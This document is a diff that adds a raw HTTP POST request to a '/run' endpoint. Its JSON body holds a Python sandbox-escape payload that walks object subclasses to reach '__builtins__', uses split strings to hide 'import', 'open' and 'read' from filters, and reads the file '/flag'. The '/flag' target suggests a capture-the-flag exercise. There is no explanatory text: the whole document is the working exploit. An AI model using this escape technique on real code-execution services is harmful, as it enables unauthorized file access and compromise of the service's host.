@@ -1,0 +1,5 @@
+POST /run HTTP/1.1
+Host: 6a06qu5xkmh6vepz.neu-nex.fun
+Content-Type: application/json
+
+{"code": "subs = ().__class__.__base__.__subclasses__()\nc = [x for x in subs if x.__name__ == 'catch_warnings'][0]\nb = c.__init__.__globals__['__builtins__']\nos = b['__imp'+'ort__']('os')\nfd = getattr(os, 'op'+'en')('/flag', 0)\nprint(getattr(os, 're'+'ad')(fd, 200))"}
